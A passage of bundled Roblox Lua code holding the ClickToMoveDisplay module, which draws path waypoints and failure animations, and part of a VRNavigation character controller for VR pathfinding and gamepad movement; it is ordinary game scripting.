			end
			
			pointModel.Parent = workspace.CurrentCamera
		end
		
		return PathDisplay
		
	end[click_to_move_display] = function()
		local ClickToMoveDisplay = {}
		
		local FAILURE_ANIMATION_ID = "rbxassetid://2874840706"
		
		local TrailDotIcon = "rbxasset://textures/ui/traildot.png"
		local EndWaypointIcon = "rbxasset://textures/ui/waypoint.png"
		
		local WaypointsAlwaysOnTop = false
		
		local WAYPOINT_INCLUDE_FACTOR = 2
		local LAST_DOT_DISTANCE = 3
		
		local WAYPOINT_BILLBOARD_SIZE = UDim2.new(0, 1.68 * 25, 0, 2 * 25)
		
		local ENDWAYPOINT_SIZE_OFFSET_MIN = Vector2.new(0, 0.5)
		local ENDWAYPOINT_SIZE_OFFSET_MAX = Vector2.new(0, 1)
		
		local FAIL_WAYPOINT_SIZE_OFFSET_CENTER = Vector2.new(0, 0.5)
		local FAIL_WAYPOINT_SIZE_OFFSET_LEFT = Vector2.new(0.1, 0.5)
		local FAIL_WAYPOINT_SIZE_OFFSET_RIGHT = Vector2.new(-0.1, 0.5)
		
		local FAILURE_TWEEN_LENGTH = 0.125
		local FAILURE_TWEEN_COUNT = 4
		
		local TWEEN_WAYPOINT_THRESHOLD = 5
		
		local TRAIL_DOT_PARENT_NAME = "ClickToMoveDisplay"
		
		local TrailDotSize = Vector2.new(1.5, 1.5)
		
		local TRAIL_DOT_MIN_SCALE = 1
		local TRAIL_DOT_MIN_DISTANCE = 10
		local TRAIL_DOT_MAX_SCALE = 2.5
		local TRAIL_DOT_MAX_DISTANCE = 100
		
		local PlayersService = game:GetService("Players")
		local TweenService = game:GetService("TweenService")
		local RunService = game:GetService("RunService")
		local Workspace = game:GetService("Workspace")
		
		local LocalPlayer = PlayersService.LocalPlayer
		
		local function CreateWaypointTemplates()
			local TrailDotTemplate = Instance.new("Part")
			TrailDotTemplate.Size = Vector3.new(1, 1, 1)
			TrailDotTemplate.Anchored = true
			TrailDotTemplate.CanCollide = false
			TrailDotTemplate.Name = "TrailDot"
			TrailDotTemplate.Transparency = 1
			local TrailDotImage = Instance.new("ImageHandleAdornment")
			TrailDotImage.Name = "TrailDotImage"
			TrailDotImage.Size = TrailDotSize
			TrailDotImage.SizeRelativeOffset = Vector3.new(0, 0, -0.1)
			TrailDotImage.AlwaysOnTop = WaypointsAlwaysOnTop
			TrailDotImage.Image = TrailDotIcon
			TrailDotImage.Adornee = TrailDotTemplate
			TrailDotImage.Parent = TrailDotTemplate
		
			local EndWaypointTemplate = Instance.new("Part")
			EndWaypointTemplate.Size = Vector3.new(2, 2, 2)
			EndWaypointTemplate.Anchored = true
			EndWaypointTemplate.CanCollide = false
			EndWaypointTemplate.Name = "EndWaypoint"
			EndWaypointTemplate.Transparency = 1
			local EndWaypointImage = Instance.new("ImageHandleAdornment")
			EndWaypointImage.Name = "TrailDotImage"
			EndWaypointImage.Size = TrailDotSize
			EndWaypointImage.SizeRelativeOffset = Vector3.new(0, 0, -0.1)
			EndWaypointImage.AlwaysOnTop = WaypointsAlwaysOnTop
			EndWaypointImage.Image = TrailDotIcon
			EndWaypointImage.Adornee = EndWaypointTemplate
			EndWaypointImage.Parent = EndWaypointTemplate
			local EndWaypointBillboard = Instance.new("BillboardGui")
			EndWaypointBillboard.Name = "EndWaypointBillboard"
			EndWaypointBillboard.Size = WAYPOINT_BILLBOARD_SIZE
			EndWaypointBillboard.LightInfluence = 0
			EndWaypointBillboard.SizeOffset = ENDWAYPOINT_SIZE_OFFSET_MIN
			EndWaypointBillboard.AlwaysOnTop = true
			EndWaypointBillboard.Adornee = EndWaypointTemplate
			EndWaypointBillboard.Parent = EndWaypointTemplate
			local EndWaypointImageLabel = Instance.new("ImageLabel")
			EndWaypointImageLabel.Image = EndWaypointIcon
			EndWaypointImageLabel.BackgroundTransparency = 1
			EndWaypointImageLabel.Size = UDim2.new(1, 0, 1, 0)
			EndWaypointImageLabel.Parent = EndWaypointBillboard
		
		
			local FailureWaypointTemplate = Instance.new("Part")
			FailureWaypointTemplate.Size = Vector3.new(2, 2, 2)
			FailureWaypointTemplate.Anchored = true
			FailureWaypointTemplate.CanCollide = false
			FailureWaypointTemplate.Name = "FailureWaypoint"
			FailureWaypointTemplate.Transparency = 1
			local FailureWaypointImage = Instance.new("ImageHandleAdornment")
			FailureWaypointImage.Name = "TrailDotImage"
			FailureWaypointImage.Size = TrailDotSize
			FailureWaypointImage.SizeRelativeOffset = Vector3.new(0, 0, -0.1)
			FailureWaypointImage.AlwaysOnTop = WaypointsAlwaysOnTop
			FailureWaypointImage.Image = TrailDotIcon
			FailureWaypointImage.Adornee = FailureWaypointTemplate
			FailureWaypointImage.Parent = FailureWaypointTemplate
			local FailureWaypointBillboard = Instance.new("BillboardGui")
			FailureWaypointBillboard.Name = "FailureWaypointBillboard"
			FailureWaypointBillboard.Size = WAYPOINT_BILLBOARD_SIZE
			FailureWaypointBillboard.LightInfluence = 0
			FailureWaypointBillboard.SizeOffset = FAIL_WAYPOINT_SIZE_OFFSET_CENTER
			FailureWaypointBillboard.AlwaysOnTop = true
			FailureWaypointBillboard.Adornee = FailureWaypointTemplate
			FailureWaypointBillboard.Parent = FailureWaypointTemplate
			local FailureWaypointFrame = Instance.new("Frame")
			FailureWaypointFrame.BackgroundTransparency = 1
			FailureWaypointFrame.Size = UDim2.new(0, 0, 0, 0)
			FailureWaypointFrame.Position = UDim2.new(0.5, 0, 1, 0)
			FailureWaypointFrame.Parent = FailureWaypointBillboard
			local FailureWaypointImageLabel = Instance.new("ImageLabel")
			FailureWaypointImageLabel.Image = EndWaypointIcon
			FailureWaypointImageLabel.BackgroundTransparency = 1
			FailureWaypointImageLabel.Position = UDim2.new(
				0, -WAYPOINT_BILLBOARD_SIZE.X.Offset/2, 0, -WAYPOINT_BILLBOARD_SIZE.Y.Offset
			)
			FailureWaypointImageLabel.Size = WAYPOINT_BILLBOARD_SIZE
			FailureWaypointImageLabel.Parent = FailureWaypointFrame
		
			return TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate
		end
		
		local TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
		
		local function getTrailDotParent()
			local camera = Workspace.CurrentCamera
			local trailParent = camera:FindFirstChild(TRAIL_DOT_PARENT_NAME)
			if not trailParent then
				trailParent = Instance.new("Model")
				trailParent.Name = TRAIL_DOT_PARENT_NAME
				trailParent.Parent = camera
			end
			return trailParent
		end
		
		local function placePathWaypoint(waypointModel, position)
			local ray = Ray.new(position + Vector3.new(0, 2.5, 0), Vector3.new(0, -10, 0))
			local hitPart, hitPoint, hitNormal = Workspace:FindPartOnRayWithIgnoreList(
				ray,
				{ Workspace.CurrentCamera, LocalPlayer.Character }
			)
			if hitPart then
				waypointModel.CFrame = CFrame.new(hitPoint, hitPoint + hitNormal)
				waypointModel.Parent = getTrailDotParent()
			end
		end
		
		local TrailDot = {}
		TrailDot.__index = TrailDot
		
		function TrailDot:Destroy()
			self.DisplayModel:Destroy()
		end
		
		function TrailDot:NewDisplayModel(position)
			local newDisplayModel = TrailDotTemplate:Clone()
			placePathWaypoint(newDisplayModel, position)
			return newDisplayModel
		end
		
		function TrailDot.new(position, closestWaypoint)
			local self = setmetatable({}, TrailDot)
		
			self.DisplayModel = self:NewDisplayModel(position)
			self.ClosestWayPoint = closestWaypoint
		
			return self
		end
		
		local EndWaypoint = {}
		EndWaypoint.__index = EndWaypoint
		
		function EndWaypoint:Destroy()
			self.Destroyed = true
			self.Tween:Cancel()
			self.DisplayModel:Destroy()
		end
		
		function EndWaypoint:NewDisplayModel(position)
			local newDisplayModel = EndWaypointTemplate:Clone()
			placePathWaypoint(newDisplayModel, position)
			return newDisplayModel
		end
		
		function EndWaypoint:CreateTween()
			local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, -1, true)
			local tween = TweenService:Create(
				self.DisplayModel.EndWaypointBillboard,
				tweenInfo,
				{ SizeOffset = ENDWAYPOINT_SIZE_OFFSET_MAX }
			)
			tween:Play()
			return tween
		end
		
		function EndWaypoint:TweenInFrom(originalPosition)
			local currentPositon = self.DisplayModel.Position
			local studsOffset = originalPosition - currentPositon
			self.DisplayModel.EndWaypointBillboard.StudsOffset = Vector3.new(0, studsOffset.Y, 0)
			local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
			local tween = TweenService:Create(
				self.DisplayModel.EndWaypointBillboard,
				tweenInfo,
				{ StudsOffset = Vector3.new(0, 0, 0) }
			)
			tween:Play()
			return tween
		end
		
		function EndWaypoint.new(position, closestWaypoint, originalPosition)
			local self = setmetatable({}, EndWaypoint)
		
			self.DisplayModel = self:NewDisplayModel(position)
			self.Destroyed = false
			if originalPosition and (originalPosition - position).magnitude > TWEEN_WAYPOINT_THRESHOLD then
				self.Tween = self:TweenInFrom(originalPosition)
				coroutine.wrap(function()
					self.Tween.Completed:Wait()
					if not self.Destroyed then
						self.Tween = self:CreateTween()
					end
				end)()
			else
				self.Tween = self:CreateTween()
			end
			self.ClosestWayPoint = closestWaypoint
		
			return self
		end
		
		local FailureWaypoint = {}
		FailureWaypoint.__index = FailureWaypoint
		
		function FailureWaypoint:Hide()
			self.DisplayModel.Parent = nil
		end
		
		function FailureWaypoint:Destroy()
			self.DisplayModel:Destroy()
		end
		
		function FailureWaypoint:NewDisplayModel(position)
			local newDisplayModel = FailureWaypointTemplate:Clone()
			placePathWaypoint(newDisplayModel, position)
			local ray = Ray.new(position + Vector3.new(0, 2.5, 0), Vector3.new(0, -10, 0))
			local hitPart, hitPoint, hitNormal = Workspace:FindPartOnRayWithIgnoreList(
				ray, { Workspace.CurrentCamera, LocalPlayer.Character }
			)
			if hitPart then
				newDisplayModel.CFrame = CFrame.new(hitPoint, hitPoint + hitNormal)
				newDisplayModel.Parent = getTrailDotParent()
			end
			return newDisplayModel
		end
		
		function FailureWaypoint:RunFailureTween()
			wait(FAILURE_TWEEN_LENGTH) -- Delay one tween length betfore starting tweening
			-- Tween out from center
			local tweenInfo = TweenInfo.new(FAILURE_TWEEN_LENGTH/2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
			local tweenLeft = TweenService:Create(self.DisplayModel.FailureWaypointBillboard, tweenInfo,
				{ SizeOffset = FAIL_WAYPOINT_SIZE_OFFSET_LEFT })
			tweenLeft:Play()
		
			local tweenLeftRoation = TweenService:Create(self.DisplayModel.FailureWaypointBillboard.Frame, tweenInfo,
				{ Rotation = 10 })
			tweenLeftRoation:Play()
		
			tweenLeft.Completed:wait()
		
			-- Tween back and forth
			tweenInfo = TweenInfo.new(FAILURE_TWEEN_LENGTH, Enum.EasingStyle.Sine, Enum.EasingDirection.Out,
				FAILURE_TWEEN_COUNT - 1, true)
			local tweenSideToSide = TweenService:Create(self.DisplayModel.FailureWaypointBillboard, tweenInfo,
				{ SizeOffset = FAIL_WAYPOINT_SIZE_OFFSET_RIGHT})
			tweenSideToSide:Play()
		
			-- Tween flash dark and roate left and right
			tweenInfo = TweenInfo.new(FAILURE_TWEEN_LENGTH, Enum.EasingStyle.Sine, Enum.EasingDirection.Out,
				FAILURE_TWEEN_COUNT - 1, true)
			local tweenFlash = TweenService:Create(self.DisplayModel.FailureWaypointBillboard.Frame.ImageLabel, tweenInfo,
				{ ImageColor3 = Color3.new(0.75, 0.75, 0.75)})
			tweenFlash:Play()
		
			local tweenRotate = TweenService:Create(self.DisplayModel.FailureWaypointBillboard.Frame, tweenInfo,
				{ Rotation = -10 })
			tweenRotate:Play()
		
			tweenSideToSide.Completed:wait()
		
			-- Tween back to center
			tweenInfo = TweenInfo.new(FAILURE_TWEEN_LENGTH/2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
			local tweenCenter = TweenService:Create(self.DisplayModel.FailureWaypointBillboard, tweenInfo,
				{ SizeOffset = FAIL_WAYPOINT_SIZE_OFFSET_CENTER })
			tweenCenter:Play()
		
			local tweenRoation = TweenService:Create(self.DisplayModel.FailureWaypointBillboard.Frame, tweenInfo,
				{ Rotation = 0 })
			tweenRoation:Play()
		
			tweenCenter.Completed:wait()
		
			wait(FAILURE_TWEEN_LENGTH) -- Delay one tween length betfore removing
		end
		
		function FailureWaypoint.new(position)
			local self = setmetatable({}, FailureWaypoint)
		
			self.DisplayModel = self:NewDisplayModel(position)
		
			return self
		end
		
		local failureAnimation = Instance.new("Animation")
		failureAnimation.AnimationId = FAILURE_ANIMATION_ID
		
		local lastHumanoid = nil
		local lastFailureAnimationTrack = nil
		
		local function getFailureAnimationTrack(myHumanoid)
			if myHumanoid == lastHumanoid then
				return lastFailureAnimationTrack
			end
			lastFailureAnimationTrack = myHumanoid:LoadAnimation(failureAnimation)
			lastFailureAnimationTrack.Priority = Enum.AnimationPriority.Action
			lastFailureAnimationTrack.Looped = false
			return lastFailureAnimationTrack
		end
		
		local function findPlayerHumanoid()
			local character = LocalPlayer.Character
			if character then
				return character:FindFirstChildOfClass("Humanoid")
			end
		end
		
		local function createTrailDots(wayPoints, originalEndWaypoint)
			local newTrailDots = {}
			local count = 1
			for i = 1, #wayPoints - 1 do
				local closeToEnd = (wayPoints[i].Position - wayPoints[#wayPoints].Position).magnitude < LAST_DOT_DISTANCE
				local includeWaypoint = i % WAYPOINT_INCLUDE_FACTOR == 0 and not closeToEnd
				if includeWaypoint then
					local trailDot = TrailDot.new(wayPoints[i].Position, i)
					newTrailDots[count] = trailDot
					count = count + 1
				end
			end
		
			local newEndWaypoint = EndWaypoint.new(wayPoints[#wayPoints].Position, #wayPoints, originalEndWaypoint)
			table.insert(newTrailDots, newEndWaypoint)
		
			local reversedTrailDots = {}
			count = 1
			for i = #newTrailDots, 1, -1 do
				reversedTrailDots[count] = newTrailDots[i]
				count = count + 1
			end
			return reversedTrailDots
		end
		
		local function getTrailDotScale(distanceToCamera, defaultSize)
			local rangeLength = TRAIL_DOT_MAX_DISTANCE - TRAIL_DOT_MIN_DISTANCE
			local inRangePoint = math.clamp(distanceToCamera - TRAIL_DOT_MIN_DISTANCE, 0, rangeLength)/rangeLength
			local scale = TRAIL_DOT_MIN_SCALE + (TRAIL_DOT_MAX_SCALE - TRAIL_DOT_MIN_SCALE)*inRangePoint
			return defaultSize * scale
		end
		
		local createPathCount = 0
		-- originalEndWaypoint is optional, causes the waypoint to tween from that position.
		function ClickToMoveDisplay.CreatePathDisplay(wayPoints, originalEndWaypoint)
			createPathCount = createPathCount + 1
			local trailDots = createTrailDots(wayPoints, originalEndWaypoint)
		
			local function removePathBeforePoint(wayPointNumber)
				-- kill all trailDots before and at wayPointNumber
				for i = #trailDots, 1, -1 do
					local trailDot = trailDots[i]
					if trailDot.ClosestWayPoint <= wayPointNumber then
						trailDot:Destroy()
						trailDots[i] = nil
					else
						break
					end
				end
			end
		
			local reiszeTrailDotsUpdateName = "ClickToMoveResizeTrail" ..createPathCount
			local function resizeTrailDots()
				if #trailDots == 0 then
					RunService:UnbindFromRenderStep(reiszeTrailDotsUpdateName)
					return
				end
				local cameraPos = Workspace.CurrentCamera.CFrame.p
				for i = 1, #trailDots do
					local trailDotImage = trailDots[i].DisplayModel:FindFirstChild("TrailDotImage")
					if trailDotImage then
						local distanceToCamera = (trailDots[i].DisplayModel.Position - cameraPos).magnitude
						trailDotImage.Size = getTrailDotScale(distanceToCamera, TrailDotSize)
					end
				end
			end
			RunService:BindToRenderStep(reiszeTrailDotsUpdateName, Enum.RenderPriority.Camera.Value - 1, resizeTrailDots)
		
			local function removePath()
				removePathBeforePoint(#wayPoints)
			end
		
			return removePath, removePathBeforePoint
		end
		
		local lastFailureWaypoint = nil
		function ClickToMoveDisplay.DisplayFailureWaypoint(position)
			if lastFailureWaypoint then
				lastFailureWaypoint:Hide()
			end
			local failureWaypoint = FailureWaypoint.new(position)
			lastFailureWaypoint = failureWaypoint
			coroutine.wrap(function()
				failureWaypoint:RunFailureTween()
				failureWaypoint:Destroy()
				failureWaypoint = nil
			end)()
		end
		
		function ClickToMoveDisplay.CreateEndWaypoint(position)
			return EndWaypoint.new(position)
		end
		
		function ClickToMoveDisplay.PlayFailureAnimation()
			local myHumanoid = findPlayerHumanoid()
			if myHumanoid then
				local animationTrack = getFailureAnimationTrack(myHumanoid)
				animationTrack:Play()
			end
		end
		
		function ClickToMoveDisplay.CancelFailureAnimation()
			if lastFailureAnimationTrack ~= nil and lastFailureAnimationTrack.IsPlaying then
				lastFailureAnimationTrack:Stop()
			end
		end
		
		function ClickToMoveDisplay.SetWaypointTexture(texture)
			TrailDotIcon = texture
			TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
		end
		
		function ClickToMoveDisplay.GetWaypointTexture()
			return TrailDotIcon
		end
		
		function ClickToMoveDisplay.SetWaypointRadius(radius)
			TrailDotSize = Vector2.new(radius, radius)
			TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
		end
		
		function ClickToMoveDisplay.GetWaypointRadius()
			return TrailDotSize.X
		end
		
		function ClickToMoveDisplay.SetEndWaypointTexture(texture)
			EndWaypointIcon = texture
			TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
		end
		
		function ClickToMoveDisplay.GetEndWaypointTexture()
			return EndWaypointIcon
		end
		
		function ClickToMoveDisplay.SetWaypointsAlwaysOnTop(alwaysOnTop)
			WaypointsAlwaysOnTop = alwaysOnTop
			TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
		end
		
		function ClickToMoveDisplay.GetWaypointsAlwaysOnTop()
			return WaypointsAlwaysOnTop
		end
		
		return ClickToMoveDisplay
		
	end[vrnavigation] = function()
		
		--[[
				VRNavigation
		--]]
		
		local VRService = game:GetService("VRService")
		local UserInputService = game:GetService("UserInputService")
		local RunService = game:GetService("RunService")
		local Players = game:GetService("Players")
		local PathfindingService = game:GetService("PathfindingService")
		local ContextActionService = game:GetService("ContextActionService")
		local StarterGui = game:GetService("StarterGui")
		
		--local MasterControl = require(script.Parent)
		local PathDisplay = nil
		local LocalPlayer = Players.LocalPlayer
		
		--[[ Constants ]]--
		local RECALCULATE_PATH_THRESHOLD = 4
		local NO_PATH_THRESHOLD = 12
		local MAX_PATHING_DISTANCE = 200
		local POINT_REACHED_THRESHOLD = 1
		local OFFTRACK_TIME_THRESHOLD = 2
		local THUMBSTICK_DEADZONE = 0.22
		
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local XZ_VECTOR3 = Vector3.new(1,0,1)
		
		--[[ Utility Functions ]]--
		local function IsFinite(num)
			return num == num and num ~= 1/0 and num ~= -1/0
		end
		
		local function IsFiniteVector3(vec3)
			return IsFinite(vec3.x) and IsFinite(vec3.y) and IsFinite(vec3.z)
		end
		
		local movementUpdateEvent = Instance.new("BindableEvent")
		movementUpdateEvent.Name = "MovementUpdate"
		movementUpdateEvent.Parent = script
		
		coroutine.wrap(function()
			local PathDisplayModule = script.Parent:WaitForChild("PathDisplay")
			if PathDisplayModule then
				PathDisplay = require(PathDisplayModule)
			end
		end)()
		
		
		--[[ The Class ]]--
		local BaseCharacterController = require(script.Parent:WaitForChild("BaseCharacterController"))
		local VRNavigation = setmetatable({}, BaseCharacterController)
		VRNavigation.__index = VRNavigation
		
		function VRNavigation.new(CONTROL_ACTION_PRIORITY)
			local self = setmetatable(BaseCharacterController.new(), VRNavigation)
		
			self.CONTROL_ACTION_PRIORITY = CONTROL_ACTION_PRIORITY
		
			self.navigationRequestedConn = nil
			self.heartbeatConn = nil
		
			self.currentDestination = nil
			self.currentPath = nil
			self.currentPoints = nil
			self.currentPointIdx = 0
		
			self.expectedTimeToNextPoint = 0
			self.timeReachedLastPoint = tick()
			self.moving = false
		
			self.isJumpBound = false
			self.moveLatch = false
		
			self.userCFrameEnabledConn = nil
		
			return self
		end
		
		function VRNavigation:SetLaserPointerMode(mode)
			pcall(function()
				StarterGui:SetCore("VRLaserPointerMode", mode)
			end)
		end
		
		function VRNavigation:GetLocalHumanoid()
			local character = LocalPlayer.Character
			if not character then
				return
			end
		
			for _, child in pairs(character:GetChildren()) do
				if child:IsA("Humanoid") then
					return child
				end
			end
			return nil
		end
		
		function VRNavigation:HasBothHandControllers()
			return VRService:GetUserCFrameEnabled(Enum.UserCFrame.RightHand) and VRService:GetUserCFrameEnabled(Enum.UserCFrame.LeftHand)
		end
		
		function VRNavigation:HasAnyHandControllers()
			return VRService:GetUserCFrameEnabled(Enum.UserCFrame.RightHand) or VRService:GetUserCFrameEnabled(Enum.UserCFrame.LeftHand)
		end
		
		function VRNavigation:IsMobileVR()
			return UserInputService.TouchEnabled
		end
		
		function VRNavigation:HasGamepad()
			return UserInputService.GamepadEnabled
		end
		
		function VRNavigation:ShouldUseNavigationLaser()
			--Places where we use the navigation laser:
			-- mobile VR with any number of hands tracked
			-- desktop VR with only one hand tracked
			-- desktop VR with no hands and no gamepad (i.e. with Oculus remote?)
			--using an Xbox controller with a desktop VR headset means no laser since the user has a thumbstick.
			--in the future, we should query thumbstick presence with a features API
			if self:IsMobileVR() then
				return true
			else
				if self:HasBothHandControllers() then
					return false
				end
				if not self:HasAnyHandControllers() then
					return not self:HasGamepad()
				end
				return true
			end
		end
		
		
		
		function VRNavigation:StartFollowingPath(newPath)
			currentPath = newPath
			currentPoints = currentPath:GetPointCoordinates()
			currentPointIdx = 1
			moving = true
		
			timeReachedLastPoint = tick()
		
			local humanoid = self:GetLocalHumanoid()
			if humanoid and humanoid.Torso and #currentPoints >= 1 then
				local dist = (currentPoints[1] - humanoid.Torso.Position).magnitude
				expectedTimeToNextPoint = dist / humanoid.WalkSpeed
			end
		
			movementUpdateEvent:Fire("targetPoint", self.currentDestination)
		end
		
		function VRNavigation:GoToPoint(point)
			currentPath = true
			currentPoints = { point }
			currentPointIdx = 1
			moving = true
		
			local humanoid = self:GetLocalHumanoid()
			local distance = (humanoid.Torso.Position - point).magnitude
			local estimatedTimeRemaining = distance / humanoid.WalkSpeed
		
			timeReachedLastPoint = tick()
			expectedTimeToNextPoint = estimatedTimeRemaining
		
			movementUpdateEvent:Fire("targetPoint", point)
		end
		
		function VRNavigation:StopFollowingPath()
			currentPath = nil
			currentPoints = nil
			currentPointIdx = 0
			moving = false
			self.moveVector = ZERO_VECTOR3
		end
		
		function VRNavigation:TryComputePath(startPos, destination)
			local numAttempts = 0
			local newPath = nil
		
			while not newPath and numAttempts < 5 do
				newPath = PathfindingService:ComputeSmoothPathAsync(startPos, destination, MAX_PATHING_DISTANCE)
				numAttempts = numAttempts + 1
		
				if newPath.Status == Enum.PathStatus.ClosestNoPath or newPath.Status == Enum.PathStatus.ClosestOutOfRange then
					newPath = nil
					break
				end
		
				if newPath and newPath.Status == Enum.PathStatus.FailStartNotEmpty then
					startPos = startPos + (destination - startPos).unit
					newPath = nil
				end
		
				if newPath and newPath.Status == Enum.PathStatus.FailFinishNotEmpty then
					destination = destination + Vector3.new(0, 1, 0)
					newPath = nil
				end
			end
		
			return newPath
		end
		
		function VRNavigation:OnNavigationRequest(destinationCFrame, inputUserCFrame )
			local destinationPosition = destinationCFrame.p
			local lastDestination = self.currentDestination
		
			if not IsFiniteVector3(destinationPosition) then
				return
			end
		
			self.currentDestination = destinationPosition
		
			local humanoid = self:GetLocalHumanoid()
			if not humanoid or not humanoid.Torso then
				return
			end
		
			local currentPosition = humanoid.Torso.Position
			local distanceToDestination = (self.currentDestination - currentPosition).magnitude
		
			if distanceToDestination < NO_PATH_THRESHOLD then
				self:GoToPoint(self.currentDestination)
				return
			end
		
			if not lastDestination or (self.currentDestination - lastDestination).magnitude > RECALCULATE_PATH_THRESHOLD then
				local newPath = self:TryComputePath(currentPosition, self.currentDestination)
				if newPath then
					self:StartFollowingPath(newPath)
					if PathDisplay then
						PathDisplay.setCurrentPoints(self.currentPoints)
						PathDisplay.renderPath()
					end
				else
					self:StopFollowingPath()
					if PathDisplay then
						PathDisplay.clearRenderedPath()
					end
				end
			else
				if moving then
					self.currentPoints[#currentPoints] = self.currentDestination
				else
					self:GoToPoint(self.currentDestination)
				end
			end
		end
		
		function VRNavigation:OnJumpAction(actionName, inputState, inputObj)
			if inputState == Enum.UserInputState.Begin then
				self.isJumping = true
			end
			return Enum.ContextActionResult.Sink
		end
		function VRNavigation:BindJumpAction(active)
			if active then
				if not self.isJumpBound then
					self.isJumpBound = true
					ContextActionService:BindActionAtPriority("VRJumpAction", (function() return self:OnJumpAction() end), false,
						self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.ButtonA)
				end
			else
				if self.isJumpBound then
					self.isJumpBound = false
					ContextActionService:UnbindAction("VRJumpAction")
				end
			end
		end
		
		function VRNavigation:ControlCharacterGamepad(actionName, inputState, inputObject)
			if inputObject.KeyCode ~= Enum.KeyCode.Thumbstick1 then return end
		
			if inputState == Enum.UserInputState.Cancel then
				self.moveVector =  ZERO_VECTOR3
				return
			end
		
			if inputState ~= Enum.UserInputState.End then
				self:StopFollowingPath()
				if PathDisplay then
					PathDisplay.clearRenderedPath()
				end
		
				if self:ShouldUseNavigationLaser() then
					self:BindJumpAction(true)
					self:SetLaserPointerMode("Hidden")
				end
		
				if inputObject.Position.magnitude > THUMBSTICK_DEADZONE then
					self.moveVector = Vector3.new(inputObject.Position.X, 0, -inputObject.Position.Y)
					if self.moveVector.magnitude > 0 then
						self.moveVector = self.moveVector.unit * math.min(1, inputObject.Position.magnitude)
					end
		
					self.moveLatch = true
				end
			else
				self.moveVector =  ZERO_VECTOR3
		
				if self:ShouldUseNavigationLaser() then
					self:BindJumpAction(false)
					self:SetLaserPointerMode("Navigation")
				end
		
				if self.moveLatch then
					self.moveLatch = false
					movementUpdateEvent:Fire("offtrack")
				end
			end
			return Enum.ContextActionResult.Sink
		end
		
		function VRNavigation:OnHeartbeat(dt)
			local newMoveVector = self.moveVector
			local humanoid = self:GetLocalHumanoid()
			if not humanoid or not humanoid.Torso then
				return
			end
		
			if self.moving and self.currentPoints then
				local currentPosition = humanoid.Torso.Position
				local goalPosition = currentPoints[1]
				local vectorToGoal = (goalPosition - currentPosition) * XZ_VECTOR3
				local moveDist = vectorToGoal.magnitude
				local moveDir = vectorToGoal / moveDist
		
				if moveDist < POINT_REACHED_THRESHOLD then
					local estimatedTimeRemaining = 0
					local prevPoint = currentPoints[1]
					for i, point in pairs(currentPoints) do
						if i ~= 1 then
							local dist = (point - prevPoint).magnitude
							prevPoint = point
							estimatedTimeRemaining = estimatedTimeRemaining + (dist / humanoid.WalkSpeed)
						end
					end
		
					table.remove(currentPoints, 1)
					currentPointIdx = currentPointIdx + 1
		
					if #currentPoints == 0 then
						self:StopFollowingPath()
						if PathDisplay then
							PathDisplay.clearRenderedPath()
						end
						return
					else
						if PathDisplay then
							PathDisplay.setCurrentPoints(currentPoints)
							PathDisplay.renderPath()
						end
		
						local newGoal = currentPoints[1]
						local distanceToGoal = (newGoal - currentPosition).magnitude
						expectedTimeToNextPoint = distanceToGoal / humanoid.WalkSpeed
						timeReachedLastPoint = tick()
					end
				else
					local ignoreTable = {
						game.Players.LocalPlayer.Character,
						workspace.CurrentCamera
					}
					local obstructRay = Ray.new(currentPosition - Vector3.new(0, 1, 0), moveDir * 3)
					local obstructPart, obstructPoint, obstructNormal = workspace:FindPartOnRayWithIgnoreList(obstructRay, ignoreTable)
		
					if obstructPart then
						local heightOffset = Vector3.new(0, 100, 0)
						local jumpCheckRay = Ray.new(obstructPoint + moveDir * 0.5 + heightOffset, -heightOffset)
						local jumpCheckPart, jumpCheckPoint, jumpCheckNormal = workspace:FindPartOnRayWithIgnoreList(jumpCheckRay, ignoreTable)
		
						local heightDifference = jumpCheckPoint.Y - currentPosition.Y
						if heightDifference < 6 and heightDifference > -2 then
							humanoid.Jump = true
						end
					end
		
					local timeSinceLastPoint = tick() - timeReachedLastPoint
					if timeSinceLastPoint > expectedTimeToNextPoint + OFFTRACK_TIME_THRESHOLD then
						self:StopFollowingPath()
						if PathDisplay then
							PathDisplay.clearRenderedPath()
						end
		
						movementUpdateEvent:Fire("offtrack")
					end
		
					newMoveVector = self.moveVector:Lerp(moveDir, dt * 10)
				end
			end
		
			if IsFiniteVector3(newMoveVector) then
				self.moveVector = newMoveVector
			end
		end
		
		
		function VRNavigation:OnUserCFrameEnabled()
			if self:ShouldUseNavigationLaser() then
				self:BindJumpAction(false)
				self:SetLaserPointerMode("Navigation")
			else
				self:BindJumpAction(true)
				self:SetLaserPointerMode("Hidden")
			end
		end
		
		function VRNavigation:Enable(enable)
		
			self.moveVector = ZERO_VECTOR3
			self.isJumping = false
		
			if enable then
				self.navigationRequestedConn = VRService.NavigationRequested:Connect(function(destinationCFrame, inputUserCFrame) self:OnNavigationRequest(destinationCFrame, inputUserCFrame) end)
				self.heartbeatConn = RunService.Heartbeat:Connect(function(dt) self:OnHeartbeat(dt) end)
		
				ContextActionService:BindAction("MoveThumbstick", (function(actionName, inputState, inputObject) return self:ControlCharacterGamepad(actionName, inputState, inputObject) end),
					false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.Thumbstick1)
				ContextActionService:BindActivate(Enum.UserInputType.Gamepad1, Enum.KeyCode.ButtonR2)
		
				self.userCFrameEnabledConn = VRService.UserCFrameEnabled:Connect(function() self:OnUserCFrameEnabled() end)
				self:OnUserCFrameEnabled()
		
				VRService:SetTouchpadMode(Enum.VRTouchpad.Left, Enum.VRTouchpadMode.VirtualThumbstick)
				VRService:SetTouchpadMode(Enum.VRTouchpad.Right, Enum.VRTouchpadMode.ABXY)
		
				self.enabled = true
			else
				-- Disable
				self:StopFollowingPath()
		
				ContextActionService:UnbindAction("MoveThumbstick")
				ContextActionService:UnbindActivate(Enum.UserInputType.Gamepad1, Enum.KeyCode.ButtonR2)
		
